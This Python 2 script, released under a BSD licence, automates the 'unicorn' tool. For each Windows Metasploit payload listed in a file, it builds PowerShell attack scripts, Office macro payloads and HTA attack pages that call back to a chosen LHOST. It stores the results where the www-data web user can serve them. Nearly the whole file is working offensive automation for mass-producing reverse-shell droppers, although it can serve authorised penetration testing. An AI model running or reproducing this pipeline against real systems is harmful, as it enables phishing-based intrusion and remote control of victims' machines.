#!/usr/bin/python
# -*- coding: utf-8 -*-

# Copyright (c) 2017, Carlos Polop Martin <carlospolop[at]gmail.com
# All rights reserved.
#
# Redistribution and use in source and binary forms, with or without modification, are permitted
# provided that the following conditions are met:
#
# Redistributions of source code must retain the above copyright notice, this list of conditions and
# the following disclaimer.
#
# Redistributions in binary form must reproduce the above copyright notice, this list of conditions
# and the following disclaimer in the documentation and/or other materials provided with the
# distribution.
#
# THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS" AND ANY EXPRESS OR
# IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND
# FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT HOLDER OR
# CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL
# DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE,
# DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER
# IN CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT
# OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.

import os
import subprocess
import re
import shutil
import sys
from config_paths import *

main_save_path = main_path+"unicorn/"

def main_directory():
    if os.path.exists(main_save_path):
        shutil.rmtree(main_save_path)
    os.makedirs(main_save_path)

def save_help():
    comando = unicorn_path + "unicorn.py --help > "+ main_save_path + "/help.txt"
    subprocess.check_output(comando, shell=True)

def payloads():
    payloads = {}
    f = open(payloads_path,'r')
    try:
        for line in f:
            linea = line.split(" ")
            if linea[1]:
                payloads[linea[0].strip()] = linea[1].strip()
    except:
        print("Incorrect payloads file: "+payloads_path)
    finally:
        f.close()
        return payloads

def create_dir(directorio):
    create_dir_path = main_save_path + directorio
    if not os.path.exists(create_dir_path):
        print "Creating directory: "+create_dir_path
        os.makedirs(create_dir_path)


def unicorn(payload, lport):
    global LHOST
    comando = unicorn_path + "unicorn.py "+ payload + " "+ LHOST + " " + lport

    try:
        print comando
        print "-------------------------------------------------"
        subprocess.check_output(comando, shell=True)
        os.rename("powershell_attack.txt", main_save_path + payload + ".ps1") #Lo renombra y lo mueve
    except subprocess.CalledProcessError as e:
        print "Couldn't create the payload: "+payload

    comando_macro = comando + " macro"
    try:
        print comando_macro
        print "-------------------------------------------------"
        subprocess.check_output(comando_macro, shell=True)
        os.rename("powershell_attack.txt", main_save_path + payload + "_macro.txt") #Lo renombra y lo mueve
    except subprocess.CalledProcessError as e:
        print "Couldn't create the macro: "+payload

    comando_hta = comando + " hta"
    try:
        print comando_hta
        print "-------------------------------------------------"
        subprocess.check_output(comando_hta, shell=True)
        shutil.copytree("hta_attack", main_save_path + payload)
        shutil.rmtree("hta_attack")
    except subprocess.CalledProcessError as e:
        print "Couldn't create the macro: "+payload


###############
## MAIN PART ##
###############
print ""
print "#################################################"
print "UNICORN:"
if len(sys.argv) > 1:
    if ip_validator(sys.argv[1]):
        LHOST = sys.argv[1]
    else:
        print "Give a correct Ip address"
        exit(-1)
else:
    LHOST = autoLHOST()
    print "Using IP: "+LHOST

main_directory()
save_help()
payloads_dic = payloads()
for payload in payloads_dic.keys():
    lport = payloads_dic[payload]
    if "windows" in payload:
        payload_name = re.search(r'/\w+$', payload)
        directorio = payload.replace(payload_name.group(),"")
        create_dir(directorio)

        print ""
        print "#################################################"
        print "CREATING PAYLOAD: "+payload
        print "-------------------------------------------------"
        unicorn(payload,lport)
        print "_________________________________________________"

os.system("chown www-data -R "+main_save_path)
